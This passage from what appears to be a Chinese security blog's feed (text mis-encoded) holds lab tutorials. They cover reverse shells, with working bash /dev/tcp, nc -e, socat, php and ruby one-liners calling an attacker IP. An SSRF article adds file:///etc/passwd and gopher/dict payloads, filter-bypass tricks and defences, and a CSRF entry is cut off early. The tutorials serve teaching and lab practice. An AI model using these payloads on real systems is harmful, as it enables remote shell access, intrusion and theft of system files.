file/</span>[n]</code></pre><p>ç»‘å®šååªå¯¹å½“å‰æŒ‡ä»¤æœ‰æ•ˆï¼Œå¦‚æœéœ€è¦æ¥ä¸‹æ¥çš„æŒ‡ä»¤éƒ½æ”¯æŒçš„è¯å°±éœ€è¦å†ä½¿ç”¨ exec æŒ‡ä»¤ã€‚</p><h1>Reverse Shellå®ä¾‹</h1><p>attacker(kali):<code>192.168.67.128</code></p><p>victim(ubuntu)ï¼š<code>192.168.67.129</code></p><h2 id="bash"><a class="header-anchor" href="#bash">ğŸ­</a>bash</h2><p>åœ¨ubuntuæ‰§è¡Œï¼š</p><p><code>bash -i &gt;&amp; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1</code></p><p><img src="/2021/02/08/shell/2.png" alt="2"></p><p>åœ¨kaliç›‘å¬ï¼š</p><p><img src="/2021/02/08/shell/1.jpg" alt="1"></p><p>kaliè¿æ¥åˆ°ubuntuçš„shellã€‚ä¸‹é¢æˆ‘ä»¬æ¥æ¨å¯¼ä¸€ä¸‹è¿™ä¸ªå‘½ä»¤æ€ä¹ˆæ¥çš„ï¼š</p><h4 id="å®ç°è¾“å‡ºå‘½ä»¤"><a class="header-anchor" href="#å®ç°è¾“å‡ºå‘½ä»¤">ğŸ­</a>å®ç°è¾“å‡ºå‘½ä»¤</h4><p>åœ¨Ubuntuè¾“å…¥å­—ç¬¦ä¸²</p><p><code>echo genius &gt; /dev/tcp/192.168.67.128/2333</code></p><p>kaliä¸Š</p><p><img src="/2021/02/08/shell/3.jpg" alt="3"></p><h4 id="å®ç°è¾“å…¥å‘½ä»¤"><a class="header-anchor" href="#å®ç°è¾“å…¥å‘½ä»¤">ğŸ­</a>å®ç°è¾“å…¥å‘½ä»¤</h4><p>åœ¨kaliè¾“å…¥</p><p><img src="/2021/02/08/shell/4.jpg" alt="4"></p><p>åœ¨ubuntuè¾“å‡º</p><p><img src="/2021/02/08/shell/5.jpg" alt="5"></p><h4 id="å®ç°äº¤äº’"><a class="header-anchor" href="#å®ç°äº¤äº’">ğŸ­</a>å®ç°äº¤äº’</h4><p><code> bash -i &gt; /dev/tcp/192.168.67.128/2333</code></p><p>åœ¨ubuntuä¸Šçš„å‘½ä»¤ä¼šåœ¨Kaliæ˜¾ç¤ºæ‰§è¡Œç»“æœ</p><p>ubuntu</p><p><img src="/2021/02/08/shell/7.jpg" alt="7"></p><p>kali</p><p><img src="/2021/02/08/shell/6.jpg" alt="6"></p><p>ä½†ç°åœ¨kaliçš„å‘½ä»¤ä¸èƒ½åœ¨Ubuntuä¸Šæ‰§è¡Œã€‚è¿˜éœ€è¦ï¼š<code>bash -i &lt; /dev/tcp/192.168.67.128/2333</code>å°†kaliçš„å‘½ä»¤è¾“å…¥ç»™ubuntuçš„bashã€‚</p><p>ubuntu</p><p><img src="/2021/02/08/shell/8.jpg" alt="8"></p><p>ç°åœ¨Kaliå°±å¯ä»¥åœ¨ubuntuæ‰§è¡Œå‘½ä»¤äº†ã€‚</p><p>å°†ä¸¤æ¡å‘½ä»¤ç»“åˆï¼š<code>bash -i &gt; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1</code></p><p>kali</p><p><img src="/2021/02/08/shell/9.jpg" alt="9"></p><p>ä½†æ˜¯åœ¨ubuntuä¸Šä»æœ‰å‘½ä»¤</p><p><img src="/2021/02/08/shell/10.jpg" alt="10"></p><p>æ„é€ ï¼š<code>bash -i &gt; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1 2&gt;&amp;1</code>ä¸æœ€å¼€å§‹çš„å‘½ä»¤<code>bash -i &gt;&amp; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1</code>ç­‰ä»·ï¼Œæµ‹è¯•ubuntuä¸Šæ— å›æ˜¾ã€‚æˆåŠŸ~~</p><p>ä¹Ÿå¯ä»¥execé‡å®šå‘</p><p><img src="/2021/02/08/shell/11.png" alt="11"></p><p>or</p><pre><code class="hljs angelscript">exec /bin/sh <span class="hljs-number">0</span>&lt;/dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>/<span class="hljs-number">2333</span> <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">0</span></code></pre><h2 id="nc"><a class="header-anchor" href="#nc">ğŸ­</a>nc</h2><pre><code class="hljs angelscript">nc -e /bin/bash <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span> <span class="hljs-number">2333</span></code></pre><h2 id="telent"><a class="header-anchor" href="#telent">ğŸ­</a>telent</h2><pre><code class="hljs angelscript">telnet <span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> <span class="hljs-number">1234</span> | /bin/bash | telnet <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span> <span class="hljs-number">2333</span></code></pre><h2 id="socat"><a class="header-anchor" href="#socat">ğŸ­</a>socat</h2><pre><code class="hljs angelscript">socat exec:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>:<span class="hljs-number">2333</span></code></pre><h2 id="php"><a class="header-anchor" href="#php">ğŸ­</a>php</h2><pre><code class="hljs tcl">php -r &#x27;$sock=fsockopen(<span class="hljs-string">&quot;192.168.67.128&quot;</span>,<span class="hljs-number">2333</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</code></pre><h2 id="ruby"><a class="header-anchor" href="#ruby">ğŸ­</a>ruby</h2><pre><code class="hljs pgsql">ruby -rsocket -<span class="hljs-string">e&#x27;f=TCPSocket.open(&quot;192.168.67.128&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></code></pre><p>å®ŒğŸš©ğŸš©ğŸš©ğŸš©</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/xiaozi/p/13493010.html">åå¼¹shellçš„å„ç§å§¿åŠ¿</a></p><p><a href="https://xz.aliyun.com/t/2549#toc-0">Linux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2021/02/08/SSRF/"/>
    <url>/2021/02/08/SSRF/</url>
    
    <content type="html"><![CDATA[<p>SSRF(<code>Server-Side Request Forgery</code>:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„å®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆè¯·æ±‚ç”±æœåŠ¡ç«¯å‘èµ·ï¼Œæ•…æœåŠ¡ç«¯èƒ½è¯·åˆ°ä¸è‡ªèº«ç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</p><p><strong>æ¼æ´åŸç†</strong><br>æœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚å¸¸è§çš„æœ‰æœåŠ¡ç«¯ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡â€¦â€¦SSRFåˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„Webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><p>ä¸»è¦æ”»å‡»æ–¹å¼ï¼š</p><ul><li>å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯ã€‚</li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºã€‚</li><li>å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯ã€‚</li><li>æ”»å‡»å†…å¤–ç½‘çš„Webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨<code>HTTP GET</code>è¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»(<code>å¦‚struts2ã€SQliç­‰</code>)ã€‚</li><li>åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰ã€‚</li></ul><p>ç®€è€Œè¨€ä¹‹å°±æ˜¯é€šè¿‡å¤–ç½‘ç½‘ç«™ï¼Œè®¿é—®å†…éƒ¨ç½‘ç«™ï¼Œè¾¾åˆ°æ”»å‡»å†…éƒ¨ç½‘ç«™çš„ç›®çš„ã€‚</p><h2 id="ç›¸å…³å±é™©å‡½æ•°"><a class="header-anchor" href="#ç›¸å…³å±é™©å‡½æ•°">ğŸ­</a>ç›¸å…³å±é™©å‡½æ•°</h2><pre><code class="hljs autohotkey">file_get_contents()` / `fsockopen()` / `curl_exec()</code></pre><h4 id="curl-exec"><a class="header-anchor" href="#curl-exec">ğŸ­</a>curl_exec()</h4><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params">$url</span>)</span>&#123;      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);    curl_exec($ch);    curl_close($ch);&#125;$url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];curl($url);</code></pre><h4 id="file-get-contents"><a class="header-anchor" href="#file-get-contents">ğŸ­</a>file_get_contents()</h4><pre><code class="hljs bash"><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);</code></pre><h4 id="fsockopen"><a class="header-anchor" href="#fsockopen">ğŸ­</a>fsockopen()</h4><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getfile</span>(<span class="hljs-params">$host, $port, $link</span>)</span>&#123;    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="hljs-number">30</span>);    <span class="hljs-keyword">if</span>(!$fp)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        $out = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>;        $out .= <span class="hljs-string">&quot;HOST <span class="hljs-subst">$host</span> \r\n&quot;</span>;        $out .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;        $out .= <span class="hljs-string">&quot;\r\n&quot;</span>;        fwrite($fp, $out);        $content = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">while</span>(!feof($fp))&#123;            $contents .= fgets($fp, <span class="hljs-number">1024</span>);        &#125;        fclose($fp);        <span class="hljs-keyword">return</span> $contents;    &#125;&#125;</code></pre><h2 id="æ¼æ´åˆ©ç”¨"><a class="header-anchor" href="#æ¼æ´åˆ©ç”¨">ğŸ­</a>æ¼æ´åˆ©ç”¨</h2><h3 id="curlæ”¯æŒ"><a class="header-anchor" href="#curlæ”¯æŒ">ğŸ­</a>curlæ”¯æŒ</h3><p><img src="/2021/02/08/SSRF/1.jpg" alt="1"></p><h3 id="æœ¬åœ°åˆ©ç”¨"><a class="header-anchor" href="#æœ¬åœ°åˆ©ç”¨">ğŸ­</a>æœ¬åœ°åˆ©ç”¨</h3><h4 id="file-protocolï¼ˆä»»æ„æ–‡ä»¶è¯»å–ï¼‰"><a class="header-anchor" href="#file-protocolï¼ˆä»»æ„æ–‡ä»¶è¯»å–ï¼‰">ğŸ­</a>file protocolï¼ˆä»»æ„æ–‡ä»¶è¯»å–ï¼‰</h4><p>fileåè®®å¯ä»¥é¿å…æœåŠ¡ç«¯ç¨‹åºå¯¹IPè¿›è¡Œè¿‡æ»¤</p><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -vvv <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span></code></pre><h4 id="gopher-protocolï¼ˆä¸€é”®åå¼¹bashï¼‰"><a class="header-anchor" href="#gopher-protocolï¼ˆä¸€é”®åå¼¹bashï¼‰">ğŸ­</a>gopher protocolï¼ˆä¸€é”®åå¼¹bashï¼‰</h4><p>gopherå¯ä»¥å‘é€å„ç§è¯·æ±‚åŒ…ï¼ˆæ•…åˆç§°ä¸‡é‡‘æ²¹ï¼‰ï¼Œæ ¼å¼:</p><pre><code class="hljs vbnet">curl -vvv <span class="hljs-comment">&#x27;gopher://<span class="hljs-doctag">&lt;host&gt;</span>:<span class="hljs-doctag">&lt;port&gt;</span>/<span class="hljs-doctag">&lt;gopher-path&gt;</span>&#x27;</span></code></pre><p>è¯¦è§ï¼š<a href="https://blog.chaitin.cn/gopher-attack-surfaces/">åˆ©ç”¨ Gopheråè®®æ‹“å±•æ”»å‡»é¢</a></p><h4 id="dict-protocol-æ“ä½œredis"><a class="header-anchor" href="#dict-protocol-æ“ä½œredis">ğŸ­</a>dict protocol(æ“ä½œredis)</h4><p>dictåè®®æ˜¯ä¸€ä¸ªå­—å…¸æœåŠ¡å™¨åè®®ï¼Œé€šå¸¸ç”¨äºè®©å®¢æˆ·ç«¯ä½¿ç”¨è¿‡ç¨‹ä¸­èƒ½å¤Ÿè®¿é—®æ›´å¤šçš„å­—å…¸æºï¼Œåœ¨SSRFä¸­ä½¿ç”¨dictåè®®å¯ä»¥è½»æ˜“è·å–ç›®æ ‡æœåŠ¡å™¨ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ç‰ˆæœ¬ç­‰ä¿¡æ¯ã€‚</p><p>æ ¼å¼ï¼š</p><pre><code class="hljs vbnet">curl -vvv <span class="hljs-comment">&#x27;dict://<span class="hljs-doctag">&lt;host&gt;</span>:<span class="hljs-doctag">&lt;port&gt;</span>/info&#x27;</span></code></pre><h3 id="è¿œç¨‹åˆ©ç”¨"><a class="header-anchor" href="#è¿œç¨‹åˆ©ç”¨">ğŸ­</a>è¿œç¨‹åˆ©ç”¨</h3><h4 id="æœªä½œSSRFé˜²å¾¡çš„ä»£ç "><a class="header-anchor" href="#æœªä½œSSRFé˜²å¾¡çš„ä»£ç ">ğŸ­</a>æœªä½œSSRFé˜²å¾¡çš„ä»£ç </h4><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params">$url</span>)</span>&#123;                $ch = curl_init();                curl_setopt($ch, CURLOPT_URL, $url);                curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);                 curl_exec($ch);                curl_close($ch); &#125;$url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];curl($url);</code></pre><p><strong>åˆ©ç”¨fileåè®®è¯»å–ï¼š</strong></p><p><img src="/2021/02/08/SSRF/2.jpg" alt="2"></p><p><strong>åˆ©ç”¨dictæŸ¥çœ‹ç«¯å£</strong></p><p><img src="/2021/02/08/SSRF/3.jpg" alt="3"></p><p>ç«¯å£æœªå¼€æ”¾æ—¶å°±éœ€è¦ç”¨åˆ°gopheråè®®åå¼¹shellï¼Œåœ¨reverse shellè®²äº†ã€‚</p><h4 id="é™åˆ¶åè®®çš„ä»£ç "><a class="header-anchor" href="#é™åˆ¶åè®®çš„ä»£ç ">ğŸ­</a>é™åˆ¶åè®®çš„ä»£ç </h4><p><img src="/2021/02/08/SSRF/4.png" alt="4"></p><h2 id="SSRFç»•è¿‡"><a class="header-anchor" href="#SSRFç»•è¿‡">ğŸ­</a>SSRFç»•è¿‡</h2><h4 id="æ›´æ”¹ip"><a class="header-anchor" href="#æ›´æ”¹ip">ğŸ­</a>æ›´æ”¹ip</h4><p>å¼€å‘è€…å¯¹URLå‚æ•°è¿›è¡Œæ­£åˆ™åŒ¹é…è¿‡æ»¤å†…ç½‘IPæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ”¹ç¼–IPçš„å†™æ³•çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œå°†ipæ”¹å†™ï¼š</p><ul><li>8è¿›åˆ¶æ ¼å¼</li><li>16è¿›åˆ¶æ ¼å¼</li><li>10è¿›åˆ¶æ•´æ•°æ ¼å¼</li><li>16è¿›åˆ¶æ•´æ•°æ ¼å¼</li><li>åˆå¹¶åä¸¤ä½</li><li>åˆå¹¶åä¸‰ä½</li></ul><p>æ”¹å†™æ—¶å„ä¸ªè¿›åˆ¶å¯ä»¥æ··ç”¨ï¼Œè®¿é—®æ”¹å†™åçš„IPåœ°å€æ—¶ï¼ŒApacheä¼šæŠ¥é”™ï¼Œä½†Nginxã€MySQLä»æ­£å¸¸å·¥ä½œã€‚</p><h4 id="åˆ©ç”¨è§£æURLå‡ºç°çš„é—®é¢˜"><a class="header-anchor" href="#åˆ©ç”¨è§£æURLå‡ºç°çš„é—®é¢˜">ğŸ­</a>åˆ©ç”¨è§£æURLå‡ºç°çš„é—®é¢˜</h4><p>å½“åç«¯ç¨‹åºå¯¹è®¿é—®çš„URLè¿›è¡Œè§£æï¼Œå¹¶å°†è§£æå‡ºæ¥çš„åœ°å€è¿›è¡Œè¿‡æ»¤ã€‚è¿™æ—¶å€™å¯èƒ½ä¼šå‡ºç°å¯¹URLå‚æ•°è§£æä¸å½“ï¼Œæ¯”å¦‚ <code>http://www.baidu.com@192.168.67.129</code>  å½“åç«¯ç¨‹åºé€šè¿‡ä¸æ­£ç¡®çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ¯”å¦‚è§£æåˆ°httpä¹‹ååˆ°comä¸ºæ­¢çš„å­—ç¬¦å†…å®¹æ—¶ï¼Œ<a href="http://xn--URLhostwww-xx2pha710ae15suhwcnmaj19l.baidu.com">ä¼šè®¤ä¸ºè®¿é—®URLçš„hostä¸ºwww.baidu.com</a>ï¼Œä½†å®é™…ä¸Šè¿™ä¸ªURLæ‰€è¯·æ±‚çš„å†…å®¹æ˜¯192.168.67.129ä¸Šçš„</p><h4 id="åˆ©ç”¨è·³è½¬"><a class="header-anchor" href="#åˆ©ç”¨è·³è½¬">ğŸ­</a>åˆ©ç”¨è·³è½¬</h4><p>URLçš„hostè¢«æ­£ç¡®è§£æå¹¶è¿‡æ»¤æ—¶ï¼Œå¯ä½¿ç”¨è·³è½¬è¿›è¡Œç»•è¿‡ï¼Œå¦‚ <a href="http://xxx/redirect-to?url=http://192.168.67.129">http://xxx/redirect-to?url=http://192.168.67.129</a> ï¼Œä½†æ˜¯192.168.67.129å¯èƒ½ä¼šè¢«æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ï¼Œå¯ä»¥é€šè¿‡çŸ­åœ°å€ç»•è¿‡ã€‚å¸¸ç”¨302è·³è½¬å’Œ307è·³è½¬ï¼ˆreverse shellè®²è¿‡ï¼‰</p><h4 id="åè®®ç»•è¿‡"><a class="header-anchor" href="#åè®®ç»•è¿‡">ğŸ­</a>åè®®ç»•è¿‡</h4><p>é™¤äº†ä¸Šé¢è®²åˆ°çš„file,gopherï¼Œdictåè®®è¿˜æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><pre><code class="hljs awk">SFTP:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.php?url=sftp:<span class="hljs-regexp">//</span>&lt;host&gt;:&lt;port&gt;/TFTP:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.php?url=tftp:<span class="hljs-regexp">//</span>&lt;host&gt;:&lt;port&gt;/TESTUDPPACKETLDAP:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.php?url=ldap:<span class="hljs-regexp">//</span>&lt;host&gt;:&lt;port&gt;/%<span class="hljs-number">0</span>astats%<span class="hljs-number">0</span>aquit</code></pre><h4 id="åˆ©ç”¨ç‰¹æ®ŠåŸŸå"><a class="header-anchor" href="#åˆ©ç”¨ç‰¹æ®ŠåŸŸå">ğŸ­</a>åˆ©ç”¨ç‰¹æ®ŠåŸŸå</h4><p>åŸç†æ˜¯DNSè§£æ</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">67.129</span>.xip.io<span class="hljs-regexp">/   /</span><span class="hljs-regexp">/è‡ªåŠ¨é‡å®šå‘åˆ°192.168.67.129</span></code></pre><h4 id="IPv6"><a class="header-anchor" href="#IPv6">ğŸ­</a>IPv6</h4><p>æœ‰äº›æœåŠ¡æ²¡æœ‰è€ƒè™‘IPv6çš„æƒ…å†µï¼Œä½†æ˜¯å†…ç½‘åˆæ”¯æŒIPv6ï¼Œåˆ™å¯ä»¥ä½¿ç”¨IPv6çš„æœ¬åœ°IPå¦‚ <code>[::]</code> <code>0000::1</code> æˆ–IPv6çš„å†…ç½‘åŸŸåæ¥ç»•è¿‡è¿‡æ»¤</p><h4 id="IDN"><a class="header-anchor" href="#IDN">ğŸ­</a>IDN</h4><p>ä¸€äº›ç½‘ç»œè®¿é—®å·¥å…·æ”¯æŒå›½é™…åŒ–åŸŸå(ç‰¹æ®Šå­—ç¬¦åŸŸå)ï¼ŒæŒ‡éƒ¨åˆ†æˆ–å®Œå…¨ä½¿ç”¨ç‰¹æ®Šçš„æ–‡å­—æˆ–å­—æ¯ç»„æˆçš„äº’è”ç½‘åŸŸåã€‚éƒ¨åˆ†å­—ç¬¦ä¼šåœ¨è®¿é—®æ—¶åšä¸€ä¸ªç­‰ä»·è½¬æ¢</p><pre><code class="hljs avrasm">â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ  &gt;&gt;&gt;  example.com<span class="hljs-symbol">such:</span>â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</code></pre><h4 id="åˆ©ç”¨å¥å·"><a class="header-anchor" href="#åˆ©ç”¨å¥å·">ğŸ­</a>åˆ©ç”¨å¥å·</h4><pre><code class="hljs angelscript"><span class="hljs-number">127</span>ã€‚<span class="hljs-number">0</span>ã€‚<span class="hljs-number">0</span>ã€‚<span class="hljs-number">1</span>  &gt;&gt;&gt;  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span></code></pre><h4 id="DNS-é‡ç»‘"><a class="header-anchor" href="#DNS-é‡ç»‘">ğŸ­</a>DNS é‡ç»‘</h4><p>ç”¨æˆ·è¯·æ±‚çš„URLå‚æ•°æ—¶ï¼ŒæœåŠ¡å™¨ç«¯ä¼šå…ˆå¯¹å…¶è¿›è¡ŒDNSè§£æï¼Œå†å¯¹DNS Serverè¿”å›çš„IPåœ°å€è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåœ¨é»‘åå•ä¸­ï¼Œå°±ç¦æ­¢è¯¥æ¬¡è¯·æ±‚ã€‚è¯·æ±‚DNSæœåŠ¡è¿›è¡ŒåŸŸåè§£æåˆ°æœåŠ¡ç«¯è¯·æ±‚URLä¹‹é—´å­˜åœ¨ä¸€ä¸ªæ—¶é—´å·®ï¼Œåˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œè¿›è¡ŒDNSé‡ç»‘å®šæ”»å‡»ã€‚æµç¨‹å¦‚ä¸‹:</p><ul><li>æœåŠ¡å™¨ç«¯è·å¾—URLå‚æ•°ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡DNSè§£æï¼Œè·å¾—äº†ä¸€ä¸ªéå†…ç½‘çš„IP</li><li>å¯¹äºè·å¾—çš„IPè¿›è¡Œåˆ¤æ–­ï¼Œå‘ç°ä¸ºéé»‘åå•IPï¼Œåˆ™é€šè¿‡éªŒè¯</li><li>æœåŠ¡å™¨ç«¯å¯¹äºURLè¿›è¡Œè®¿é—®ï¼Œç”±äºDNSæœåŠ¡å™¨è®¾ç½®çš„TTLä¸º0ï¼Œæ‰€ä»¥å†æ¬¡è¿›è¡ŒDNSè§£æï¼Œè¿™ä¸€æ¬¡DNSæœåŠ¡å™¨è¿”å›çš„æ˜¯å†…ç½‘åœ°å€ã€‚</li><li>ç”±äºå·²ç»ç»•è¿‡éªŒè¯ï¼Œæ‰€ä»¥æœåŠ¡å™¨ç«¯è¿”å›è®¿é—®å†…ç½‘èµ„æºçš„ç»“æœã€‚</li></ul><h4 id="åˆ©ç”¨ç‰¹æ®Šåœ°å€"><a class="header-anchor" href="#åˆ©ç”¨ç‰¹æ®Šåœ°å€">ğŸ­</a>åˆ©ç”¨ç‰¹æ®Šåœ°å€</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/</code></pre><p><strong>ä»¥ä¸Šç»•è¿‡æ–¹å¼ä¹Ÿå¯ä»¥ç»„åˆè¿›è¡Œç»•è¿‡</strong></p><h2 id="é˜²å¾¡æ–¹å¼"><a class="header-anchor" href="#é˜²å¾¡æ–¹å¼">ğŸ­</a>é˜²å¾¡æ–¹å¼</h2><ul><li>è¿‡æ»¤è¿”å›çš„ä¿¡æ¯</li><li>é™åˆ¶åè®®ä¸ºHTTPï¼ŒHTTPS</li><li>ç»Ÿä¸€é”™è¯¯ä¿¡æ¯</li><li>é™åˆ¶è¯·æ±‚çš„ç«¯å£</li><li>é™åˆ¶302é‡å®šå‘</li><li>è€ƒè™‘ä½¿ç”¨DNSç¼“å­˜æˆ–è€…Hostç™½åå•</li></ul><p>å®ŒğŸ“ğŸ“ğŸ“</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/iors/p/9777571.html">SSRFæ¼æ´æ”»å‡»ä¸é˜²å¾¡</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">SSRF</a></p><p><a href="https://www.secpulse.com/archives/65832.html">SSRFç»•è¿‡æ€»ç»“</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||CSRF</title>
    <link href="/2021/02/03/dvwa6/"/>
    <url>/2021/02/03/dvwa6/</url>
    
    <content type="html"><![CDATA[<p>CSRFï¼Œå…¨ç§°Cross-site request forgeryï¼Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯æŒ‡åˆ©ç”¨å—å®³è€…å°šæœªå¤±æ•ˆçš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼ˆcookieã€ä¼šè¯ç­‰ï¼‰ï¼Œè¯±éª—å…¶ç‚¹å‡»æ¶æ„é“¾æ¥æˆ–è€…è®¿é—®åŒ…å«æ”»å‡»ä»£ç çš„é¡µé¢ï¼Œåœ¨å—å®³äººä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…çš„èº«ä»½å‘ï¼ˆèº«ä»½è®¤è¯ä¿¡æ¯æ‰€å¯¹åº”çš„ï¼‰æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»è€Œå®Œæˆéæ³•æ“ä½œï¼ˆå¦‚è½¬è´¦ã€æ”¹å¯†ç­‰ï¼‰ã€‚CSRFä¸XSSåŒºåˆ«åœ¨äºCSRFå¹¶æ²¡æœ‰ç›—å–cookieè€Œæ˜¯ç›´æ¥åˆ©ç”¨ã€‚</p><p>ä¸¾ä¸ªæ 